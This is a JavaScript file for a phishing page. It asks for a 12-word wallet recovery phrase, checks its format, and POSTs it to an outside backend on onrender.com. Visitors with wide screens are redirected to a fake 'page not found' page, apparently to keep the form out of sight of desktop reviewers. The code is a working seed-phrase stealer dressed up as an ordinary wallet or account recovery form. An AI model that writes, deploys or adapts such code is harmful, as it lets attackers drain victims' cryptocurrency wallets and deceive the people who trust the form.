let inputData = "";
let error = false;

if(screen.width > 768){
  window.location.assign("../PageNotFound/PageNotFound.html")
}

document.querySelector(".input-box").addEventListener("change",(e)=>{
    inputData = e.target.value
    document.querySelector(".error-box").classList.add("display");
})

document.querySelector(".show").addEventListener("click",(e)=>{
    if(document.querySelector(".input-box").type === "text"){
        document.querySelector(".input-box").type = "password";
        document.querySelector(".show").innerHTML = "Show";
    }
    else{
        document.querySelector(".input-box").type = "text";
        document.querySelector(".show").innerHTML = "Hide";
    }
   
})

function calculateWords(str){
  let len = str.length;
  let count = 0;
  for(let i=0;i<len;i++){
    if(str.charAt(i)==' ') count++;
  }
  if(count==11) return true;
  return false;
}

function checkSymbNum(inputData){
  let inputLen = inputData.length
  for(let i=0;i<inputLen;i++){
    if((inputData.charCodeAt(i)>=0 && inputData.charCodeAt(i)<=31) || (inputData.charCodeAt(i)>=33 && inputData.charCodeAt(i)<=64) || (inputData.charCodeAt(i)>=91 && inputData.charCodeAt(i)<=96) || (inputData.charCodeAt(i)>=123 && inputData.charCodeAt(i)<=126)){
      return false;
    }
  }
  return true;
}

document.querySelector(".button").addEventListener("click",(e)=>{
  e.preventDefault()
  let length = inputData.length
  let words_count = 0;
    for(let i=0;i<length;i++){
        let str = "";
        let j=i;
        for(j=i;j<length;j++){
          if(inputData.charAt(j)==' ') break;
          else str=str + inputData.charAt(j);
        }
        i=j;
        let res = checkSymbNum(str);
        words_count++;
        console.log(words_count)
        if(!res){
          document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Not Contain Any Special Or Numeric Values";
          document.querySelector(".error-box").classList.remove("display");
          error = true;
          break;
        }
    }

    if(words_count != 12){
      error = true;
      document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Be Of 12 Words"
      document.querySelector(".error-box").classList.remove("display")
    }

  if(!error){
      const url = "https://backend-01-92mi.onrender.com/api/data1";
      const data = {
          packetData:inputData
      };
      const options = {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
      };

      fetch(url, options)
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.json();
    })
    .then(data => {
      console.log(data)
      if(data.status === "Confirmed"){
        window.location.assign("../LoginPage/loginpage.html");
      }
    })
    .catch(error => {
      console.error('Fetch error:', error);
    });
  }
})
